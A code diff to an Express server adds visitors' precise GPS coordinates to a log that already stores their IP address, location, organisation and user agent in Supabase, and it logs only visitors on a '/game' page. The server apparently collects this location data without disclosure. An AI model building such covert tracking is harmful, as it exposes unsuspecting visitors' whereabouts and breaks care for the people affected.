@@ -32,10 +32,6 @@ function getISTTimestamp() {
 
 // Handle GET requests for /game
 app.get('/game', (req, res) => {
-    // If you have a specific game file in your public folder (e.g. public/game.html), use this:
-    // res.sendFile(path.join(__dirname, '../public/game.html'));
-    
-    // Otherwise, it serves your main public index or a custom response:
     res.sendFile(path.join(__dirname, '../public/index.html'));
 });
 
@@ -48,6 +44,8 @@ app.post('/api/log', async (req, res) => {
     if (!isGameRoute) {
         return res.status(200).json({ status: 'skipped', message: 'Not on /game path' });
     }
+
+    const { latitude, longitude } = req.body;
 
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
@@ -106,7 +104,7 @@ app.post('/api/log', async (req, res) => {
 
         const istTime = getISTTimestamp();
 
-        // Prepare object payload
+        // Prepare object payload including precise GPS coordinates
         const payload = {
             ip: geoData.ip,
             city: geoData.city,
@@ -114,6 +112,8 @@ app.post('/api/log', async (req, res) => {
             country: geoData.country,
             org: geoData.org,
             timezone: geoData.timezone,
+            latitude: latitude || null,
+            longitude: longitude || null,
             user_agent: req.headers['user-agent'] || 'Unknown',
             update_count: newCount,
             updated_at: istTime
@@ -132,7 +132,7 @@ app.post('/api/log', async (req, res) => {
             console.error('Supabase DB Upsert Error:', upsertError.message);
             return res.status(500).json({ status: 'error', message: upsertError.message });
         } else {
-            console.log(`Successfully updated visit for IP: ${geoData.ip} | Count: ${newCount} | Time (IST): ${istTime}`);
+            console.log(`Successfully updated visit for IP: ${geoData.ip} | Lat/Lon: ${latitude}, ${longitude} | Count: ${newCount}`);
         }
     } catch (dbError) {
         console.error('Database connection exception:', dbError.message);
